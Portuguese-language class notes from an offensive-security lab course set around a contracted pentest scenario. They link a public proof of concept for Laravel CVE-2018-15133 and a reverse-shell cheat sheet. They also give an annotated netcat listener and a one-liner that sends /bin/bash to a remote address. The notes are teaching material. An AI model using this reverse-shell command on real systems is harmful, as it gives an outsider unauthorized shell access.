# Exploração
os testes da semana seram feitos no lab fornecido pela CrowSec Segurança Ofensiva.

- Cenário:
    > A empresa chamada CS Hosting nos contratou para que nós realizassemos um pentest (achar, explorar e identificar as vulnerabilidades) dentro de sua estrutura.

- Repos:
    > CVE-2018-15133 (PoC) - https://github.com/aljavier/exploit_laravel_cve-2018-15133

---

## Comandos
```bash
# Criando uma conexão usando o netcat
$ nc -lnvp 8443 # -l indica que que a conexão irá escutar uma porta; -n para não resolver DNS reversos quando houver uma tentativa de conexão; -v indica que terá um output verbose das interações; -p especifica a porta sendo nesse caso a 8443 (a porta tem que ser maior que 1024 por não não ser posível fazer bind de portas abaixo disso sem ser como admin)

# Acessando uma porta de um endereço (ip/dns) usando o netcat
$ nc <endereço desejado> <porta que foi feito o bind> -e /bin/bash # -e especifica que será enviado um programa via tcp para o endereço desejado; 

```

> Notas da aula

- Pentest Monkey (Reverse Shell Payload) - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Ngrok (Reverse Shell Listener) - https://ngrok.com/